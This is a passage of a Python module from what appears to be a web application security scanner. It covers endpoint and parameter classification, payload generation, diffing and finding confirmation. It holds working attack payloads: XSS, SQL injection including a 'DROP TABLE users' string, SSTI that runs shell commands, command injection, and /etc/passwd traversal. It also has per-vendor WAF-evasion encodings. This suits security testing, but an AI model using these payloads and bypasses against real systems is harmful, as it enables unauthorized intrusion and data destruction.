"""
Discovery Infrastructure
============================================
Comprehensive attack-surface mapping system that ties together all recon
components and exposes a clean API for the scan pipeline.

Components built here:
  1. EndpointClassificationEngine  — categorises every discovered endpoint
  2. ParameterIntelligenceEngine   — analyses parameter types & risk
  3. ContextAwarePayloadFramework  — generates targeted payloads per context
  4. EncodingFramework             — multi-layer payload encoding variants
  5. DifferentialAnalysisEngine    — response diffing against baseline
  6. TripleConfirmationFramework   — 3-pass false-positive reduction
  7. EvidenceCollectionFramework   — structured evidence store per finding
  8. EvidenceGraph                 — relationship graph across all evidence
  9. AttackChainEngine             — links findings into exploit chains
 10. MultiAccountFramework         — multi-session IDOR / BOLA testing
 11. DiscoveryOrchestrator         — top-level coordinator (entry-point)

All classes are async-first and integrate with the existing
HTTPClient / BaselineEngine / ConfidenceEngine stack.
"""
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  WebShield — Advanced Web Application Security Scanner                  ║
# ║  Copyright (c) 2026 علاء محمود البدوي (Alaa Mahmoud El-Badawi)         ║
# ║  All rights reserved. For authorized security research only.            ║
# ╚══════════════════════════════════════════════════════════════════════════╝

from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import re
import time
import urllib.parse
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import (
    Any, AsyncIterator, Dict, Iterator, List, Optional,
    Sequence, Set, Tuple,
)
from urllib.parse import parse_qs, urlencode, urljoin, urlparse

from ..core.http_client import HTTPClient, HTTPResponse
from ..core.target import ScanTarget
from ..utils.response_analyzer import ResponseAnalyzer, SimilarityResult
from ..utils.confidence_engine import ConfidenceEngine, ConfidenceInput, EvidenceQuality

# ---------------------------------------------------------------------------
# 1.  EndpointClassificationEngine
# ---------------------------------------------------------------------------

class EndpointType(str, Enum):
    """Semantic category of a discovered endpoint."""
    AUTHENTICATION   = "authentication"
    FILE_UPLOAD      = "file_upload"
    SEARCH           = "search"
    ADMIN            = "admin"
    PAYMENT          = "payment"
    PROFILE          = "profile"
    API              = "api"
    DOWNLOAD         = "download"
    CONFIGURATION    = "configuration"
    HEALTH_CHECK     = "health_check"
    STATIC_RESOURCE  = "static_resource"
    GRAPHQL          = "graphql"
    WEBSOCKET        = "websocket"
    OAUTH            = "oauth"
    PASSWORD_RESET   = "password_reset"
    REGISTRATION     = "registration"
    WEBHOOK          = "webhook"
    EXPORT           = "export"
    UNKNOWN          = "unknown"


# Keyword rules: list of (regex-pattern, EndpointType)
_EP_RULES: List[Tuple[re.Pattern, EndpointType]] = [
    (re.compile(r"/graphql|/graphiql|/playground", re.I),       EndpointType.GRAPHQL),
    (re.compile(r"wss?://|/ws$|/websocket", re.I),              EndpointType.WEBSOCKET),
    (re.compile(r"/oauth|/oidc|/saml|/sso", re.I),              EndpointType.OAUTH),
    (re.compile(r"/login|/signin|/auth(?!or)", re.I),           EndpointType.AUTHENTICATION),
    (re.compile(r"/logout|/signout", re.I),                     EndpointType.AUTHENTICATION),
    (re.compile(r"/register|/signup|/create.?account", re.I),   EndpointType.REGISTRATION),
    (re.compile(r"/forgot.?pass|/reset.?pass|/password", re.I), EndpointType.PASSWORD_RESET),
    (re.compile(r"/upload|/import|/attach", re.I),              EndpointType.FILE_UPLOAD),
    (re.compile(r"/download|/export|/report", re.I),            EndpointType.DOWNLOAD),
    (re.compile(r"/pay|/checkout|/billing|/invoice|/cart", re.I), EndpointType.PAYMENT),
    (re.compile(r"/admin|/dashboard|/manage|/console|/panel", re.I), EndpointType.ADMIN),
    (re.compile(r"/config|/settings|/preferences|/setup", re.I), EndpointType.CONFIGURATION),
    (re.compile(r"/health|/status|/ping|/ready|/live", re.I),  EndpointType.HEALTH_CHECK),
    (re.compile(r"/profile|/account|/me$|/user", re.I),        EndpointType.PROFILE),
    (re.compile(r"/search|/find|/query|/filter|/autocomplete", re.I), EndpointType.SEARCH),
    (re.compile(r"/webhook|/callback|/notify|/hook", re.I),    EndpointType.WEBHOOK),
    (re.compile(r"/api/|/v\d+/|/rest/", re.I),                 EndpointType.API),
    (re.compile(r"\.(js|css|png|jpg|gif|ico|woff|svg|ttf)$", re.I), EndpointType.STATIC_RESOURCE),
]


@dataclass
class ClassifiedEndpoint:
    """An endpoint annotated with its semantic type and risk level."""
    url: str
    method: str
    endpoint_type: EndpointType
    risk_score: float          # 0.0 – 1.0
    parameters: List["ClassifiedParameter"] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "method": self.method,
            "type": self.endpoint_type.value,
            "risk_score": round(self.risk_score, 2),
            "parameter_count": len(self.parameters),
            "notes": self.notes,
        }


# Risk weights per endpoint type
_EP_RISK: Dict[EndpointType, float] = {
    EndpointType.ADMIN:          1.0,
    EndpointType.AUTHENTICATION: 0.95,
    EndpointType.PAYMENT:        0.95,
    EndpointType.FILE_UPLOAD:    0.90,
    EndpointType.PASSWORD_RESET: 0.85,
    EndpointType.CONFIGURATION:  0.85,
    EndpointType.GRAPHQL:        0.80,
    EndpointType.OAUTH:          0.80,
    EndpointType.PROFILE:        0.75,
    EndpointType.EXPORT:         0.75,
    EndpointType.DOWNLOAD:       0.70,
    EndpointType.WEBHOOK:        0.70,
    EndpointType.API:            0.65,
    EndpointType.SEARCH:         0.60,
    EndpointType.REGISTRATION:   0.60,
    EndpointType.WEBSOCKET:      0.55,
    EndpointType.HEALTH_CHECK:   0.30,
    EndpointType.STATIC_RESOURCE:0.10,
    EndpointType.UNKNOWN:        0.40,
}


class EndpointClassificationEngine:
    """
    Classifies discovered endpoints by semantic type and assigns a risk score.

    Usage::

        engine = EndpointClassificationEngine()
        for url, method in discovered_urls:
            ep = engine.classify(url, method)
            print(ep.endpoint_type, ep.risk_score)
    """

    def classify(
        self,
        url: str,
        method: str = "GET",
        parameters: Optional[List["ClassifiedParameter"]] = None,
    ) -> ClassifiedEndpoint:
        ep_type = self._match_type(url)
        base_risk = _EP_RISK.get(ep_type, 0.40)

        notes: List[str] = []

        # Boost risk for POST/PUT/PATCH/DELETE
        if method.upper() in ("POST", "PUT", "PATCH", "DELETE"):
            base_risk = min(1.0, base_risk + 0.05)
            notes.append(f"Mutating HTTP method ({method}) increases risk")

        # Boost if endpoint has parameters
        params = parameters or []
        if params:
            param_boost = min(0.15, len(params) * 0.03)
            base_risk = min(1.0, base_risk + param_boost)

        return ClassifiedEndpoint(
            url=url,
            method=method,
            endpoint_type=ep_type,
            risk_score=round(base_risk, 3),
            parameters=params,
            notes=notes,
        )

    def _match_type(self, url: str) -> EndpointType:
        for pattern, ep_type in _EP_RULES:
            if pattern.search(url):
                return ep_type
        return EndpointType.UNKNOWN

    def classify_batch(
        self,
        endpoints: List[Tuple[str, str]],
    ) -> List[ClassifiedEndpoint]:
        """Classify a list of (url, method) tuples and return sorted by risk."""
        results = [self.classify(url, method) for url, method in endpoints]
        results.sort(key=lambda e: e.risk_score, reverse=True)
        return results


# ---------------------------------------------------------------------------
# 2.  ParameterIntelligenceEngine
# ---------------------------------------------------------------------------

class ParameterType(str, Enum):
    """Data type inferred for a request parameter."""
    INTEGER        = "integer"
    FLOAT          = "float"
    BOOLEAN        = "boolean"
    UUID           = "uuid"
    JWT            = "jwt"
    BASE64         = "base64"
    JSON           = "json"
    XML            = "xml"
    PATH           = "path"
    EMAIL          = "email"
    URL            = "url"
    TIMESTAMP      = "timestamp"
    HASH           = "hash"
    SERIALIZED     = "serialized"
    GRAPHQL_VAR    = "graphql_variable"
    MULTIPART      = "multipart"
    COOKIE         = "cookie"
    TEXT           = "text"
    UNKNOWN        = "unknown"


class ParameterLocation(str, Enum):
    QUERY    = "query"
    BODY     = "body"
    HEADER   = "header"
    COOKIE   = "cookie"
    PATH     = "path"
    FRAGMENT = "fragment"


@dataclass
class ClassifiedParameter:
    """A request parameter with inferred type, location, and risk."""
    name: str
    value: str
    location: ParameterLocation
    param_type: ParameterType
    risk_score: float           # 0.0 – 1.0
    is_reflected: bool = False
    is_persistent: bool = False
    notes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "value": self.value[:80] + ("…" if len(self.value) > 80 else ""),
            "location": self.location.value,
            "type": self.param_type.value,
            "risk_score": round(self.risk_score, 2),
            "is_reflected": self.is_reflected,
            "notes": self.notes,
        }


# Type-detection rules: list of (regex-on-value, ParameterType)
_VALUE_RULES: List[Tuple[re.Pattern, ParameterType]] = [
    (re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.I), ParameterType.UUID),
    (re.compile(r"^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$"),                    ParameterType.JWT),
    (re.compile(r"^<?xml"),                                                                  ParameterType.XML),
    (re.compile(r"^\s*[\[{]"),                                                               ParameterType.JSON),
    (re.compile(r"^[A-Za-z0-9+/]{20,}={0,2}$"),                                            ParameterType.BASE64),
    (re.compile(r"^O:\d+:"),                                                                 ParameterType.SERIALIZED),
    (re.compile(r"^-?\d+\.\d+$"),                                                           ParameterType.FLOAT),
    (re.compile(r"^-?\d+$"),                                                                 ParameterType.INTEGER),
    (re.compile(r"^(true|false|1|0|yes|no)$", re.I),                                       ParameterType.BOOLEAN),
    (re.compile(r"^\d{10,13}$"),                                                             ParameterType.TIMESTAMP),
    (re.compile(r"^[0-9a-f]{32,64}$", re.I),                                               ParameterType.HASH),
    (re.compile(r"[a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,}", re.I),                       ParameterType.EMAIL),
    (re.compile(r"^https?://", re.I),                                                        ParameterType.URL),
    (re.compile(r"\.\./|\.\.\\|%2e%2e", re.I),                                              ParameterType.PATH),
]

# Risk weights by parameter name keywords
_NAME_RISK: List[Tuple[re.Pattern, float]] = [
    (re.compile(r"redirect|url|callback|next|return|dest", re.I), 0.85),
    (re.compile(r"file|path|dir|folder|include|require", re.I),   0.85),
    (re.compile(r"cmd|exec|shell|run|eval|code", re.I),           0.95),
    (re.compile(r"sql|query|db|table|column|where", re.I),        0.80),
    (re.compile(r"id|uuid|ref|key|token|hash", re.I),             0.70),
    (re.compile(r"user|email|account|login|pass", re.I),          0.75),
    (re.compile(r"xml|xsl|xslt|dtd|entity", re.I),               0.85),
    (re.compile(r"template|view|layout|theme|skin", re.I),        0.80),
    (re.compile(r"host|server|port|proto|scheme", re.I),          0.80),
]


class ParameterIntelligenceEngine:
    """
    Analyses discovered parameters to infer their data type and risk level,
    guiding which scanners should prioritise each parameter.
    """

    def classify(
        self,
        name: str,
        value: str = "",
        location: ParameterLocation = ParameterLocation.QUERY,
    ) -> ClassifiedParameter:
        param_type = self._infer_type(value)
        risk = self._calc_risk(name, value, param_type)
        notes: List[str] = []

        if param_type == ParameterType.JWT:
            notes.append("JWT — check alg:none, weak secret, claim injection")
        if param_type == ParameterType.SERIALIZED:
            notes.append("PHP serialized object — check deserialization RCE")
        if param_type == ParameterType.URL:
            notes.append("URL value — candidate for SSRF / open redirect")
        if param_type == ParameterType.PATH:
            notes.append("Path traversal sequences detected in value")
        if param_type in (ParameterType.INTEGER, ParameterType.UUID):
            notes.append("Numeric/UUID ID — check IDOR / BOLA")

        return ClassifiedParameter(
            name=name,
            value=value,
            location=location,
            param_type=param_type,
            risk_score=round(risk, 3),
            notes=notes,
        )

    def _infer_type(self, value: str) -> ParameterType:
        value = value.strip()
        for pattern, ptype in _VALUE_RULES:
            if pattern.match(value):
                return ptype
        return ParameterType.TEXT

    def _calc_risk(self, name: str, value: str, param_type: ParameterType) -> float:
        # Start with type-based risk
        type_risk: Dict[ParameterType, float] = {
            ParameterType.JWT:         0.85,
            ParameterType.SERIALIZED:  0.95,
            ParameterType.URL:         0.85,
            ParameterType.PATH:        0.90,
            ParameterType.XML:         0.80,
            ParameterType.JSON:        0.70,
            ParameterType.UUID:        0.65,
            ParameterType.INTEGER:     0.60,
            ParameterType.HASH:        0.60,
            ParameterType.BOOLEAN:     0.35,
            ParameterType.FLOAT:       0.50,
            ParameterType.TIMESTAMP:   0.40,
            ParameterType.EMAIL:       0.55,
            ParameterType.BASE64:      0.65,
            ParameterType.TEXT:        0.50,
            ParameterType.UNKNOWN:     0.40,
        }
        risk = type_risk.get(param_type, 0.40)

        # Boost based on parameter name
        for pattern, boost in _NAME_RISK:
            if pattern.search(name):
                risk = max(risk, boost)
                break

        return min(1.0, risk)

    def extract_from_url(self, url: str) -> List[ClassifiedParameter]:
        """Parse query string from a URL and classify each parameter."""
        parsed = urlparse(url)
        params: List[ClassifiedParameter] = []
        for name, values in parse_qs(parsed.query, keep_blank_values=True).items():
            value = values[0] if values else ""
            params.append(self.classify(name, value, ParameterLocation.QUERY))
        return params

    def extract_from_body(
        self,
        body: str,
        content_type: str = "application/x-www-form-urlencoded",
    ) -> List[ClassifiedParameter]:
        """Parse form / JSON body and classify parameters."""
        params: List[ClassifiedParameter] = []
        ct = content_type.lower()

        if "json" in ct:
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    for name, value in data.items():
                        params.append(self.classify(
                            name, str(value), ParameterLocation.BODY
                        ))
            except json.JSONDecodeError:
                pass
        elif "form" in ct or not ct:
            for name, values in parse_qs(body, keep_blank_values=True).items():
                value = values[0] if values else ""
                params.append(self.classify(name, value, ParameterLocation.BODY))

        return params


# ---------------------------------------------------------------------------
# 3.  Context-Aware Payload Framework
# ---------------------------------------------------------------------------

class PayloadContext(str, Enum):
    """What rendering / processing context will receive the payload."""
    HTML_ATTR    = "html_attr"
    HTML_TEXT    = "html_text"
    JS_STRING    = "js_string"
    JS_CODE      = "js_code"
    SQL_STRING   = "sql_string"
    SQL_NUMERIC  = "sql_numeric"
    JSON_STRING  = "json_string"
    XML_ATTR     = "xml_attr"
    XML_TEXT     = "xml_text"
    PATH_SEGMENT = "path_segment"
    SHELL_ARG    = "shell_arg"
    HEADER_VALUE = "header_value"
    URL_PARAM    = "url_param"
    TEMPLATE_VAR = "template_var"
    LDAP_FILTER  = "ldap_filter"


@dataclass
class ContextualPayload:
    """A single payload tailored for a specific context."""
    value: str
    context: PayloadContext
    vuln_type: str          # e.g. "xss", "sqli", "cmdi"
    expected_evidence: str  # what to look for in the response
    risk_level: str = "Medium"
    encoding: str = "none"


class ContextAwarePayloadFramework:
    """
    Generates targeted payloads based on:
      - Rendering context  (HTML, JS, SQL, shell …)
      - Backend technology (MySQL vs PostgreSQL, Apache vs Nginx …)
      - WAF presence       (evasion variants auto-selected)
      - Parameter type     (integer vs text vs JWT …)

    Returns only payloads that make sense for the given combination,
    minimising request count while maximising detection accuracy.
    """

    # XSS payloads per context
    _XSS_PAYLOADS: Dict[PayloadContext, List[str]] = {
        PayloadContext.HTML_ATTR: [
            '" onmouseover="alert(1)',
            "' onfocus='alert(1)' autofocus='",
            '" autofocus onfocus="alert(1)',
            "javascript:alert(1)",
        ],
        PayloadContext.HTML_TEXT: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
        ],
        PayloadContext.JS_STRING: [
            "'-alert(1)-'",
            '";alert(1);//',
            r"\u003cscript\u003ealert(1)\u003c/script\u003e",
        ],
    }

    # SQLi payloads per context
    _SQLI_PAYLOADS: Dict[PayloadContext, List[str]] = {
        PayloadContext.SQL_STRING: [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "' UNION SELECT NULL--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        ],
        PayloadContext.SQL_NUMERIC: [
            "1 OR 1=1",
            "1; DROP TABLE users--",
            "1 AND SLEEP(5)",
            "1 UNION SELECT NULL,NULL--",
        ],
    }

    # SSTI payloads
    _SSTI_PAYLOADS: List[str] = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    ]

    # CMDI payloads
    _CMDI_PAYLOADS: Dict[PayloadContext, List[str]] = {
        PayloadContext.SHELL_ARG: [
            "; id",
            "| id",
            "` id `",
            "$(id)",
            "; sleep 5",
            "| sleep 5",
            "& ping -c 5 127.0.0.1 &",
        ],
    }

    # Path traversal
    _PATH_PAYLOADS: List[str] = [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "%c0%ae%c0%ae/etc/passwd",
    ]

    def get_payloads(
        self,
        context: PayloadContext,
        vuln_type: str,
        *,
        tech_stack: Optional[List[str]] = None,
        waf_detected: bool = False,
        limit: int = 10,
    ) -> List[ContextualPayload]:
        """
        Return payloads for a given (context, vuln_type) combination.

        Parameters
        ----------
        context:      Rendering context the value will be placed into.
        vuln_type:    Vulnerability class: "xss" | "sqli" | "ssti" | "cmdi" | "path"
        tech_stack:   Detected technologies (for DB-specific payloads).
        waf_detected: True → prefer heavily encoded/obfuscated variants.
        limit:        Max payloads to return.
        """
        raw: List[str] = []

        if vuln_type == "xss":
            raw = self._XSS_PAYLOADS.get(context, self._XSS_PAYLOADS[PayloadContext.HTML_TEXT])
        elif vuln_type == "sqli":
            raw = self._SQLI_PAYLOADS.get(context, self._SQLI_PAYLOADS[PayloadContext.SQL_STRING])
        elif vuln_type == "ssti":
            raw = self._SSTI_PAYLOADS[:]
        elif vuln_type == "cmdi":
            raw = self._CMDI_PAYLOADS.get(context, self._CMDI_PAYLOADS[PayloadContext.SHELL_ARG])
        elif vuln_type == "path":
            raw = self._PATH_PAYLOADS[:]

        # Adjust for DB technology
        if tech_stack and vuln_type == "sqli":
            raw = self._tune_sqli_for_db(raw, tech_stack)

        results: List[ContextualPayload] = []
        for value in raw[:limit]:
            results.append(ContextualPayload(
                value=value,
                context=context,
                vuln_type=vuln_type,
                expected_evidence=self._evidence_hint(vuln_type),
            ))

        return results

    def _tune_sqli_for_db(self, payloads: List[str], tech_stack: List[str]) -> List[str]:
        """Keep only DB-compatible payloads based on detected technology."""
        stack_lower = [t.lower() for t in tech_stack]
        is_mysql    = any("mysql" in t or "mariadb" in t for t in stack_lower)
        is_mssql    = any("mssql" in t or "sqlserver" in t or "microsoft" in t for t in stack_lower)
        is_postgres = any("postgres" in t or "pgsql" in t for t in stack_lower)

        if is_mssql:
            # Remove MySQL-specific SLEEP, add WAITFOR
            payloads = [p for p in payloads if "SLEEP" not in p.upper()]
            payloads.insert(0, "'; WAITFOR DELAY '0:0:5'--")
        elif is_mysql:
            payloads = [p for p in payloads if "WAITFOR" not in p.upper()]
        elif is_postgres:
            payloads = [p for p in payloads if "WAITFOR" not in p.upper() and "SLEEP" not in p.upper()]
            payloads.insert(0, "'; SELECT pg_sleep(5)--")

        return payloads

    def _evidence_hint(self, vuln_type: str) -> str:
        return {
            "xss":  "Reflected payload in HTML / alert execution",
            "sqli": "SQL error | time delay | changed row count",
            "ssti": "49 in response body (7*7)",
            "cmdi": "uid= in response | time delay",
            "path": "/etc/passwd content or Windows path leak",
        }.get(vuln_type, "Unexpected response change")

    def infer_context(
        self,
        param: ClassifiedParameter,
        response_body: str = "",
    ) -> PayloadContext:
        """
        Guess the most likely rendering context for a parameter
        based on its type and how its value appears in a sample response.
        """
        # Check if value appears inside JS string
        if param.value and param.value in response_body:
            idx = response_body.find(param.value)
            surrounding = response_body[max(0, idx - 20): idx + len(param.value) + 20]
            if re.search(r"""['"]""" + re.escape(param.value), surrounding):
                return PayloadContext.JS_STRING
            if re.search(r"<[^>]+" + re.escape(param.value), surrounding):
                return PayloadContext.HTML_ATTR

        if param.param_type == ParameterType.INTEGER:
            return PayloadContext.SQL_NUMERIC
        if param.param_type == ParameterType.PATH:
            return PayloadContext.PATH_SEGMENT
        if param.param_type == ParameterType.XML:
            return PayloadContext.XML_TEXT
        if param.param_type == ParameterType.JSON:
            return PayloadContext.JSON_STRING
        if "template" in param.name.lower() or "view" in param.name.lower():
            return PayloadContext.TEMPLATE_VAR

        return PayloadContext.HTML_TEXT


# ---------------------------------------------------------------------------
# 4.  Encoding Framework
# ---------------------------------------------------------------------------

@dataclass
class EncodedPayload:
    """One encoding variant of an original payload."""
    original: str
    encoded: str
    encoding_name: str
    layers: int = 1            # number of encoding layers applied


class EncodingFramework:
    """
    Produces multiple encoded variants of a payload to bypass WAF / filters.

    Variants produced (per input payload):
      • url_encode        — %XX for all special chars
      • double_url        — %25XX (double percent)
      • unicode_escape    — \\uXXXX for ASCII chars
      • hex_escape_js     — \\xXX for ASCII chars
      • html_entity       — &#XX; decimal entities
      • base64_wrap       — base64 of payload (useful in JWT / header contexts)
      • mixed_case        — random upper/lower case on alpha chars
      • null_byte_prefix  — %00 prefix before payload
      • utf8_overlong     — 2-byte overlong UTF-8 for /
      • char_substitution — common char swaps (< → ＜ etc.)
    """

    def variants(self, payload: str, max_variants: int = 8) -> List[EncodedPayload]:
        """Return up to ``max_variants`` encoded forms of ``payload``."""
        producers = [
            self._url_encode,
            self._double_url_encode,
            self._unicode_escape,
            self._hex_escape_js,
            self._html_entity,
            self._base64_wrap,
            self._mixed_case,
            self._null_byte_prefix,
            self._utf8_overlong,
            self._char_substitution,
        ]
        results: List[EncodedPayload] = []
        for fn in producers[:max_variants]:
            try:
                ep = fn(payload)
                if ep.encoded != payload:   # only emit if encoding changed anything
                    results.append(ep)
            except Exception:
                pass
        return results

    # -- Individual encoders -------------------------------------------------

    def _url_encode(self, p: str) -> EncodedPayload:
        encoded = urllib.parse.quote(p, safe="")
        return EncodedPayload(p, encoded, "url_encode")

    def _double_url_encode(self, p: str) -> EncodedPayload:
        encoded = urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")
        return EncodedPayload(p, encoded, "double_url_encode", layers=2)

    def _unicode_escape(self, p: str) -> EncodedPayload:
        encoded = "".join(f"\\u{ord(c):04x}" if ord(c) > 31 else c for c in p)
        return EncodedPayload(p, encoded, "unicode_escape")

    def _hex_escape_js(self, p: str) -> EncodedPayload:
        encoded = "".join(f"\\x{ord(c):02x}" if 32 <= ord(c) <= 126 else c for c in p)
        return EncodedPayload(p, encoded, "hex_escape_js")

    def _html_entity(self, p: str) -> EncodedPayload:
        encoded = "".join(f"&#{ord(c)};" if ord(c) > 31 else c for c in p)
        return EncodedPayload(p, encoded, "html_entity")

    def _base64_wrap(self, p: str) -> EncodedPayload:
        encoded = base64.b64encode(p.encode()).decode()
        return EncodedPayload(p, encoded, "base64_wrap")

    def _mixed_case(self, p: str) -> EncodedPayload:
        import random
        encoded = "".join(c.upper() if (random.random() > 0.5 and c.isalpha()) else c for c in p)
        return EncodedPayload(p, encoded, "mixed_case")

    def _null_byte_prefix(self, p: str) -> EncodedPayload:
        encoded = "%00" + p
        return EncodedPayload(p, encoded, "null_byte_prefix")

    def _utf8_overlong(self, p: str) -> EncodedPayload:
        # Overlong encoding of '/'  (0x2f) → %c0%af
        encoded = p.replace("/", "%c0%af").replace("\\", "%c1%9c")
        return EncodedPayload(p, encoded, "utf8_overlong")

    def _char_substitution(self, p: str) -> EncodedPayload:
        subs = {
            "<": "＜",
            ">": "＞",
            "'": "ʼ",
            '"': "＂",
            " ": "/**/",
            "=": "%3d",
        }
        encoded = p
        for ch, rep in subs.items():
            encoded = encoded.replace(ch, rep)
        return EncodedPayload(p, encoded, "char_substitution")

    def select_best(
        self,
        payload: str,
        waf_signatures: Optional[List[str]] = None,
    ) -> EncodedPayload:
        """
        Select the most likely WAF-bypassing variant.

        If ``waf_signatures`` contains known WAF names (e.g. "cloudflare",
        "modsecurity") a heuristic picks a preferred encoding.
        Falls back to double-URL encoding as a safe default.
        """
        waf = [w.lower() for w in (waf_signatures or [])]

        if any("cloudflare" in w for w in waf):
            return self._unicode_escape(payload)
        if any("modsecurity" in w or "mod_sec" in w for w in waf):
            return self._double_url_encode(payload)
        if any("akamai" in w for w in waf):
            return self._html_entity(payload)
        if any("aws" in w or "waf" in w for w in waf):
            return self._char_substitution(payload)

        return self._double_url_encode(payload)


# ---------------------------------------------------------------------------
# 5.  Differential Analysis Engine
# ---------------------------------------------------------------------------

@dataclass
class DiffResult:
    """Comparison result between a test response and the baseline."""
    is_different: bool
    size_diff_pct: float        # % change in body size
    status_changed: bool
    header_diffs: List[str]
    content_diff_score: float   # 0.0 (identical) – 1.0 (completely different)
    timing_diff_seconds: float
    is_timing_anomaly: bool
    evidence_snippets: List[str] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)

    @property
    def significance(self) -> str:
        if not self.is_different:
            return "none"
        if self.status_changed or self.content_diff_score > 0.5:
            return "high"
        if self.content_diff_score > 0.2 or self.is_timing_anomaly:
            return "medium"
        return "low"


class DifferentialAnalysisEngine:
    """
    Compares test responses to a pre-built baseline to detect anomalies.

    Works alongside BaselineEngine — call ``compare()`` with the baseline
    response and the test response to get a structured DiffResult.
    """

    def __init__(self, timing_threshold_seconds: float = 2.0) -> None:
        self._analyzer   = ResponseAnalyzer()
        self._timing_thr = timing_threshold_seconds

    def compare(
        self,
        baseline: HTTPResponse,
        test: HTTPResponse,
        baseline_elapsed: float = 0.0,
        test_elapsed:     float = 0.0,
    ) -> DiffResult:
        base_body  = (baseline.text or "")
        test_body  = (test.text or "")
        base_size  = len(base_body)
        test_size  = len(test_body)

        # Size change
        if base_size > 0:
            size_diff_pct = abs(test_size - base_size) / base_size * 100
        else:
            size_diff_pct = 100.0 if test_size > 0 else 0.0

        # Status code change
        status_changed = baseline.status_code != test.status_code

        # Header differences
        header_diffs = self._diff_headers(baseline.headers, test.headers)

        # Content similarity
        sim: SimilarityResult = self._analyzer.compare(baseline, test)
        content_diff_score = 1.0 - sim.score

        # Timing
        timing_diff = test_elapsed - baseline_elapsed
        is_timing_anomaly = timing_diff >= self._timing_thr

        # Evidence snippets — grab new content blocks
        evidence_snippets = self._extract_new_content(base_body, test_body)

        is_different = (
            status_changed
            or size_diff_pct > 5.0
            or content_diff_score > 0.15
            or is_timing_anomaly
            or bool(header_diffs)
        )

        notes: List[str] = []
        if status_changed:
            notes.append(
                f"Status changed: {baseline.status_code} → {test.status_code}"
            )
        if is_timing_anomaly:
            notes.append(
                f"Timing anomaly: +{timing_diff:.2f}s above baseline"
            )
        if size_diff_pct > 20:
            notes.append(f"Body size changed by {size_diff_pct:.0f}%")

        return DiffResult(
            is_different=is_different,
            size_diff_pct=size_diff_pct,
            status_changed=status_changed,
            header_diffs=header_diffs,
            content_diff_score=content_diff_score,
            timing_diff_seconds=timing_diff,
            is_timing_anomaly=is_timing_anomaly,
            evidence_snippets=evidence_snippets,
            notes=notes,
        )

    def _diff_headers(
        self,
        base: Dict[str, str],
        test: Dict[str, str],
    ) -> List[str]:
        diffs: List[str] = []
        security_headers = {
            "x-frame-options", "x-xss-protection", "content-security-policy",
            "strict-transport-security", "x-content-type-options",
            "set-cookie",
        }
        for h in security_headers:
            bv = base.get(h, "")
            tv = test.get(h, "")
            if bv != tv:
                diffs.append(f"{h}: '{bv}' → '{tv}'")

        # Alert on new Set-Cookie
        if "set-cookie" in test and "set-cookie" not in base:
            diffs.append("New Set-Cookie header in test response")

        return diffs

    def _extract_new_content(self, base: str, test: str) -> List[str]:
        """Return short snippets present in test but absent from baseline."""
        snippets: List[str] = []
        # Simple token-based diff — find words in test not in baseline
        base_tokens: Set[str] = set(re.findall(r"\w{6,}", base))
        test_tokens: Set[str] = set(re.findall(r"\w{6,}", test))
        new_tokens = test_tokens - base_tokens
        # Only interesting tokens (error keywords, injected markers)
        interesting = re.compile(
            r"error|exception|warning|sql|syntax|traceback|alert|script|"
            r"passwd|shadow|root:|admin:|select|union|sleep|waitfor",
            re.I,
        )
        for tok in list(new_tokens)[:20]:
            if interesting.search(tok):
                # Find surrounding context in test body
                idx = test.lower().find(tok.lower())
                if idx >= 0:
                    snippets.append(test[max(0, idx - 40): idx + len(tok) + 40].strip())
        return snippets[:5]


# ---------------------------------------------------------------------------
# 6.  Triple Confirmation Framework
# ---------------------------------------------------------------------------

@dataclass
class ConfirmationResult:
    """Outcome of a triple-confirmation cycle."""
    confirmed: bool
    rounds: int
    positive_rounds: int
    negative_control_clean: bool
    confidence_score: float
    evidence_snippets: List[str] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)


class TripleConfirmationFramework:
    """
    Reduces false positives by re-running any candidate finding at least
    three times with independent probes before accepting it.

    Protocol
    --------
    Round 1 — exact replay of the original payload
    Round 2 — modified payload (different encoding / parameter order)
    Round 3 — negative control (benign value that should NOT trigger)

    A finding is confirmed only if rounds 1 & 2 produce anomalous diffs
    AND round 3 (negative control) looks normal.
    """

    def __init__(
        self,
        client: HTTPClient,
        diff_engine: DifferentialAnalysisEngine,
        rounds: int = 3,
        delay_between: float = 0.5,
    ) -> None:
        self._client  = client
        self._diff    = diff_engine
        self._rounds  = max(rounds, 3)
        self._delay   = delay_between

    async def confirm(
        self,
        url: str,
        method: str,
        payload: str,
        baseline_response: HTTPResponse,
        *,
        extra_headers: Optional[Dict[str, str]] = None,
        negative_value: str = "safe_value_12345",
        encoding_fw: Optional[EncodingFramework] = None,
    ) -> ConfirmationResult:
        """
        Run the triple-confirmation cycle and return a ConfirmationResult.
        """
        headers = extra_headers or {}
        positive_rounds = 0
        all_snippets: List[str] = []
        notes: List[str] = []

        # Round 1 — exact replay
        r1_resp, r1_elapsed = await self._send(url, method, payload, headers)
        diff1 = self._diff.compare(baseline_response, r1_resp)
        if diff1.is_different:
            positive_rounds += 1
            all_snippets.extend(diff1.evidence_snippets)
            notes.append("Round 1: anomalous response detected")
        else:
